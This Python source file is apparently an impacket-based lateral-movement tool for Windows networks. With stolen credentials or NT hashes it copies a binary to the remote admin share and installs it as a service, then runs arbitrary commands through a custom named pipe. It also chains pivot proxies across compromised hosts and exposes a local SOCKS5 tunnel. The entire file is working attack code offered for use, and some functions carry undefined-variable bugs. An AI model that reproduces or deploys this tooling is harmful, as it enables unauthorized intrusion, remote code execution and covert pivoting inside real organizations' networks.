#!/usr/bin/python3
from impacket.examples import logger
from impacket import version
from impacket.dcerpc.v5 import transport, scmr
from impacket.dcerpc.v5.ndr import NULL
from impacket.crypto import encryptSecret
from impacket.smbconnection import SMBConnection
from impacket.uuid import uuidtup_to_bin
from impacket.dcerpc.v5.ndr import NDRULONG, NDRVaryingString, NDRCALL, NDRPOINTER, NDRUniConformantArray, NDRSTRUCT, NDRUniFixedArray
from impacket.dcerpc.v5.dtypes import LPWSTR, LPSTR, STR, SHORT, DWORD, PCHAR, LPBYTE, WSTR, LPDWORD, DWORD_ARRAY
from impacket.dcerpc.v5.lsad import PCHAR_ARRAY
from impacket.dcerpc.v5.nrpc import UCHAR_ARRAY, PUCHAR_ARRAY
from impacket.dcerpc.v5.wkst import CHAR_ARRAY
from os import fork
from threading import Thread
from struct import unpack, pack
from sys import argv, stdout, exit
import socket
from time import sleep
import threading
import argparse


def copy(target, source_path, target_path, share="c$", lmhash="", nthash=""):
	username, password, domain = target.creds
	smb = SMBConnection(remoteName='*SMBSERVER', remoteHost=target.target_ip, sess_port=target.target_port)
	smb.login(username, password, domain, lmhash, nthash)
	with open(source_path, "rb") as f:
		print("[*] copy")
		smb.putFile(share, target_path.replace('/','\\'), f.read)

def delete():
	pass

def start_service(target, command, lmhash="", nthash=""):
	username, password, domain = target.creds
	aesKey = None
	remoteName = target.target_ip
	remoteHost = target.target_ip

	stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
	rpctransport = transport.DCERPCTransportFactory(stringbinding)
	rpctransport.set_dport(target.target_port)
	rpctransport.setRemoteHost(remoteHost)
	if hasattr(rpctransport, 'set_credentials'):
		rpctransport.set_credentials(username, password, domain, lmhash, nthash, aesKey)

	rpctransport.set_kerberos(False, None)

	dce = rpctransport.get_dce_rpc()
	dce.connect()
	dce.bind(scmr.MSRPC_UUID_SCMR)
	rpc = dce

	#create
	print("[*] creating")
	ans = scmr.hROpenSCManagerW(rpc)
	scManagerHandle = ans['lpScHandle']
	try:
		scmr.hRCreateServiceW(rpc, scManagerHandle, "lateral" + '\x00', "Lateral" + '\x00', lpBinaryPathName=command + '\x00')
	except Exception as e:
		print(str(e))

	#start
	print("[*] starting")
	ans = scmr.hROpenServiceW(rpc, scManagerHandle, "lateral"+'\x00')
	serviceHandle = ans['lpServiceHandle']
	try:
		scmr.hRStartServiceW(rpc, serviceHandle)
	except:
		pass
	scmr.hRCloseServiceHandle(rpc, serviceHandle)

def stop_service(target, lmhash="", nthash=""):
	username, password, domain = target.creds
	aesKey = None
	remoteName = target.target_ip
	remoteHost = target.target_ip

	stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
	rpctransport = transport.DCERPCTransportFactory(stringbinding)
	rpctransport.set_dport(target.target_port)
	rpctransport.setRemoteHost(remoteHost)
	if hasattr(rpctransport, 'set_credentials'):
		rpctransport.set_credentials(username, password, domain, lmhash, nthash, aesKey)

	rpctransport.set_kerberos(False, None)

	dce = rpctransport.get_dce_rpc()
	dce.connect()
	dce.bind(scmr.MSRPC_UUID_SCMR)
	rpc = dce

	#delete
	print("[*] delete")
	ans = scmr.hROpenServiceW(rpc, scManagerHandle, "lateral"+'\x00')
	serviceHandle = ans['lpServiceHandle']
	scmr.hRDeleteService(rpc, serviceHandle)
	scmr.hRCloseServiceHandle(rpc, serviceHandle)

def install_service(target):
	copy(target, "msrpc/lateral.exe", "/windows/lateral.exe")
	start_service(target, "lateral.exe")



class SC_RPC_HANDLE(NDRSTRUCT):
    structure =  (
        ('Data','20s=""'),
    )
    def getAlignment(self):
        return 1

class DCERPCSessionError(Exception):
    def __init__(self, packet, error_code):
        print(123)
        pass

class Connect(NDRCALL):
    opnum = 0
    structure = (
        ('ip',STR),
        ('port',SHORT),
    )
class ConnectResponse(NDRCALL):
    structure = (
        ('socket',DWORD),
    )

class Disconnect(NDRCALL):
    opnum = 1
    structure = (
        ('socket',DWORD),
    )
class DisconnectResponse(NDRCALL):
    structure = ()

class Send(NDRCALL):
    opnum = 2
    structure = (
        ('socket',DWORD),
        ('data',STR),
        ('len',DWORD),
    )
class SendResponse(NDRCALL):
    structure = (
        ('len',DWORD),
    )

class Recv(NDRCALL):
    opnum = 3
    structure = (
    	('sockets_count', DWORD),
        ('sockets',DWORD_ARRAY),
        ('len',DWORD),
    )
class RecvResponse(NDRCALL):
    structure = (
    	('socket',DWORD),
        ('data',CHAR_ARRAY),
        ('len',DWORD),
    )

class Execute(NDRCALL):
    opnum = 4
    structure = (
        ('cmd',STR),
    )
class ExecuteResponse(NDRCALL):
    structure = (
        ('data',LPSTR),
    )

def msrpc(target):
	username, password, domain = target.creds
	MSRPC_UUID_lateral  = uuidtup_to_bin(('00001111-2222-3333-4444-555566667777','1.0'))

	stringbinding = r'ncacn_np:%s[\pipe\lateral]' % target.target_ip
	rpctransport = transport.DCERPCTransportFactory(stringbinding)
	rpctransport.set_dport(target.target_port)
	rpctransport.setRemoteHost(target.target_ip)
	rpctransport.set_credentials(username, password, domain, "", "", None)

	dce = rpctransport.get_dce_rpc()
	dce.connect()
	dce.bind(MSRPC_UUID_lateral)
	return dce

def execute(cmd, target):
	dce = msrpc(target)
	execute = Execute()
	execute["cmd"] = cmd + "\x00"
	res = dce.request(execute)
	try:
		result = str(res["data"], "cp866")
	except:
		result = res["data"]
	dce.disconnect()
	return result

def proxy(chain, target):
	def print_proxy_chain(chain, direction="->"):
		def chain_walk(the_chain, current):
			if the_chain.target == current.target:
				print(f"[{the_chain.target}]",end="")
			else:
				print(f"{the_chain.target}",end="")
			for the_chain in the_chain.next:
				print(f" {direction} ",end="")
				chain_walk(the_chain, current)
		chain_walk(chain_get_root(chain), chain)
		stdout.write("\r")
		stdout.flush()

	def incoming(chain, dce_session, c, sock, connect_id):
		dce = dce_session["dce"]
		while True:
			if not chain.connections[connect_id]:
				print("[*] incoming closing")
				break
			dce_session["mutex"].acquire()
			recv = Recv()
			recv["sockets_count"] = len(dce_session["sockets"].keys())
			recv["sockets"] = dce_session["sockets"].keys()
			recv["len"] = 1024
			dce.call(recv.opnum, recv)
			res = dce.recv()
			dce_session["mutex"].release()
			length = unpack("<i", res[-4:])[0]
			data = res[ 8 : length+8 ]
			if length == -1:
				continue # waiting data
			if length == 0:
				print("[*] RPC incoming closed")
				chain.connections[connect_id] = False
				break
			sock = unpack("<I", res[:4])[0]
			#print("<- " + str(len(data)))
			print_proxy_chain(chain, direction="<-")
			try:
				dce_session["sockets"][sock].send(data)
			except:
				print("[*] local incoming closed")
				chain.connections[connect_id] = False
				break
		print("[debug] end thread incoming")

	def outcoming(chain, dce_session, c, sock, connect_id):
		dce = dce_session["dce"]
		while True:
			try:
				data = c.recv(1024)
			except:
				print("[*] local outcoming closed")
				chain.connections[connect_id] = False
				break
			if not data or not chain.connections[connect_id]:
				print("[*] outcoming closing")
				chain.connections[connect_id] = False
				break
			#print("-> " + str(len(data)))
			print_proxy_chain(chain, direction="->")
			send = Send()
			send["socket"] = sock
			send["data"] = data + b"\x00"
			send["len"] = len(data)
			dce_session["mutex"].acquire()
			res = dce.request(send, checkError=False)
			dce_session["mutex"].release()
		print("[debug] end thread outcoming")

	def redirect(c, chain, target, connect_id):
		if not chain.dce_session:
			chain.dce_session = {
				"main": {"dce": msrpc(chain), "mutex": threading.Lock()},
				"incoming": {"dce": msrpc(chain), "mutex": threading.Lock(), "sockets": {}},
				"outcoming": {"dce": msrpc(chain), "mutex": threading.Lock()},
			}
		dce = chain.dce_session["main"]["dce"]
		connect = Connect()
		connect["ip"] = target.ip + "\x00"
		connect["port"] = target.port
		chain.dce_session["main"]["mutex"].acquire()
		res = dce.request(connect, checkError=False)
		chain.dce_session["main"]["mutex"].release()
		if res["socket"]:
			chain.connections[connect_id] = True
			chain.dce_session["incoming"]["sockets"][res["socket"]] = c
			incoming_thr = Thread(target=incoming, args=(chain, chain.dce_session["incoming"], c, res["socket"], connect_id))
			outcoming_thr = Thread(target=outcoming, args=(chain, chain.dce_session["outcoming"], c, res["socket"], connect_id))
			incoming_thr.start()
			outcoming_thr.start()
			while chain.connections[connect_id]:
			    sleep(1)

			del(chain.dce_session["incoming"]["sockets"][res["socket"]])
			disconnect = Disconnect()
			disconnect["socket"] = res["socket"]
			chain.dce_session["main"]["mutex"].acquire()
			res = dce.request(disconnect)
			chain.dce_session["main"]["mutex"].release()

			'''
			if chain.prev:
				others_connections = False
				for sibling_chain in chain.prev.next:
					if sibling_chain.connections:
						others_connections = True
				if others_connections:
					for conn in chain.prev.connections:
						chain.prev.connections[conn] = False
			'''
		#dce.disconnect()

	def serve(s, chain, target):
		local_port = s.getsockname()[1]
		while True:
			c,info = s.accept()
			connect_id = info[1] #client rport
			redirect_thr = Thread(target=redirect, args=(c, chain, target, connect_id))
			redirect_thr.start()
			#print(f"[*] start proxy to {chain.target} ({info[0]}:{info[1]} -> {local_port})")

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(('127.0.0.1', 0))
	s.listen(10)
	serve_thr = Thread(target=serve, args=(s, chain, target))
	serve_thr.start()
	local_port = s.getsockname()[1]
	return local_port

def test_tcp(chain, target):
	global dce_sessions
	ip_from, port_from = target_from
	ip_to, port_to = target_to

	if not dce_sessions.get(ip_from):
		dce_sessions[ip_from] = {
			"main": {"dce": msrpc(chain), "mutex": threading.Lock()},
			"incoming": {"dce": msrpc(chain), "mutex": threading.Lock()},
			"outcoming": {"dce": msrpc(chain), "mutex": threading.Lock()},
		}

	dce = dce_sessions[ip_from]["main"]["dce"]
	connect = Connect()
	connect["ip"] = ip_to + "\x00"
	connect["port"] = port_to
	dce_sessions[ip_from]["main"]["mutex"].acquire()
	res = dce.request(connect, checkError=False)
	dce_sessions[ip_from]["main"]["mutex"].release()
	if res["socket"]:
		disconnect = Disconnect()
		disconnect["socket"] = res["socket"]
		dce_sessions[ip_from]["main"]["mutex"].acquire()
		res = dce.request(disconnect)
		dce_sessions[ip_from]["main"]["mutex"].release()
		return True
	else:
		return False

def socks(port):
	global dce_sessions, chain
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.bind(("127.0.0.1", port))
	s.listen(10)
	while True:
		c,info = s.accept()
		print("[socks] via %s" % chain.target)
		if not dce_sessions.get(chain.target_ip):
			dce_sessions[chain.target_ip] = {
				"main": {"dce": msrpc(chain), "mutex": threading.Lock()},
				"incoming": {"dce": msrpc(chain), "mutex": threading.Lock()},
				"outcoming": {"dce": msrpc(chain), "mutex": threading.Lock()},
			}
		req = c.recv(1024)
		ver,nauth = unpack("cc", req[:2])
		c.send(b"\x05\x00")
		req = c.recv(1024)
		ver,op,_,addr_type = unpack("cccc", req[:4])
		if op == b"\x01" and addr_type == b"\x01":
			addr = socket.inet_ntoa(req[4:8])
			port = unpack('>H', req[8:10])[0]
			print(addr,port)
			
			dce = dce_sessions[chain.target_ip]["main"]["dce"]
			connect = Connect()
			connect["ip"] = addr + "\x00"
			connect["port"] = port
			dce_sessions[chain.target_ip]["main"]["mutex"].acquire()
			res = dce.request(connect, checkError=False)
			dce_sessions[chain.target_ip]["main"]["mutex"].release()
			sock = res["socket"]
		if res["socket"]:
			c.send(b"\x05\x00\x00\x01"+req[4:8]+req[8:10])
			while True:
				data = c.recv(1024)
				if not data:
					break
				send = Send()
				send["socket"] = sock
				send["data"] = data + b"\x00"
				send["len"] = len(data)
				dce_sessions[chain.target_ip]["outcoming"]["mutex"].acquire()
				res = dce.request(send, checkError=False)
				dce_sessions[chain.target_ip]["outcoming"]["mutex"].release()

				recv = Recv()
				recv["sockets_count"] = 1
				recv["sockets"] = [sock]
				recv["len"] = 1024
				dce_sessions[chain.target_ip]["incoming"]["mutex"].acquire()
				dce.call(recv.opnum, recv)
				res = dce.recv()
				dce_sessions[chain.target_ip]["incoming"]["mutex"].release()
				length = unpack("<i", res[-4:])[0]
				data = res[ 8 : length+8 ]
				if length > 0:
					sock = unpack("<I", res[:4])[0]
					c.send(data)
				else:
					break
			disconnect = Disconnect()
			disconnect["socket"] = sock
			dce_sessions[chain.target_ip]["main"]["mutex"].acquire()
			res = dce.request(disconnect)
			dce_sessions[chain.target_ip]["main"]["mutex"].release()
		c.close()
	s.close()

def check_pipe(target):
	username, password, domain = target.creds
	try:
		MSRPC_UUID_lateral  = uuidtup_to_bin(('00001111-2222-3333-4444-555566667777','1.0'))
		stringbinding = r'ncacn_np:%s[\pipe\lateral]' % target.target_ip
		rpctransport = transport.DCERPCTransportFactory(stringbinding)
		rpctransport.set_dport(target.target_port)
		rpctransport.setRemoteHost(target.target_ip)
		rpctransport.set_credentials(username, password, domain, "", "", None)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		dce.bind(MSRPC_UUID_lateral)
		return True
	except:
		return False

class Chain:
	def __init__(self, ip, port):
		self.next = []
		self.prev = None
		self.target = ip
		self.target_port = port
		self.target_ip = ip
		self.dce_session = {}
		self.connections = {}
	def new(self, ip, port):
		self.next.append( Chain(ip, port) )
		self.next[-1].prev = self
		self.next[-1].target_ip = "127.0.0.1"
		return self.next[-1]

def chain_get_root(the_chain):
	while True:
		if not the_chain.prev:
			break
		the_chain = the_chain.prev
	return the_chain

def chain_walk(the_chain, deep=0):
	print(" "*deep + ("`" if deep > 0 else "") + (the_chain.target if the_chain.target != chain.target else the_chain.target+" <-"))
	for the_chain in the_chain.next:
		chain_walk(the_chain, deep+1)

def parse_target(cmd):
	arg_parser = argparse.ArgumentParser()
	arg_parser.add_argument('-user', dest="user", help='username', default='admin')
	arg_parser.add_argument('-dom', dest="domain", default=".", help='domain')
	arg_parser.add_argument('-pass', dest="passwd", help='password', default='qwerty=123')
	arg_parser.add_argument('-hash', dest="hash", help='NT or NT:NTLM hash (opt)')
	arg_parser.add_argument("ip", type=str, help="target IP")
	arg_parser.add_argument("port", type=int, help="target Port", nargs='?', default=445)
	args = arg_parser.parse_args(cmd)
	return args

def cmd_loop(line):
	global chain
	if not line:
		return
	if line.startswith("proxy "):
		target = parse_target(line.strip().split(" ")[1:])
		if chain:
			port = proxy(chain, target)
			chain = chain.new(target.ip, port)
		else:
			chain = Chain(target.ip, 445)
		chain.creds = (target.user, target.passwd, target.domain)
	elif line.startswith("shell "):
		pass
	elif line.startswith("test "):
		if chain:
			target = parse_target(line.strip().split(" ")[1:])
			if test_tcp(chain, target):
				print("ok")
	elif line in ("show", "bt", "stack"):
		chain_walk(chain_get_root(chain))
	elif line in ("back",):
		chain = chain.prev
	elif line in ("goto ",):
		pass
	elif line in ('exit', 'quit', 'q'):
		exit()
	elif line in ('help',):
		pass
	else:
		cmd = line
		if not check_pipe(target=chain):
			install_service(target=chain)
		print(execute(cmd, target=chain))

if __name__ == '__main__':
	chain = False
	Thread(target=socks, args=(3128,)).start()
	for arg in argv[1:]:
		cmd_loop(arg)
	while True:
		line = input(f"{chain.target if chain else 'shells'}/> ")
		cmd_loop(line)
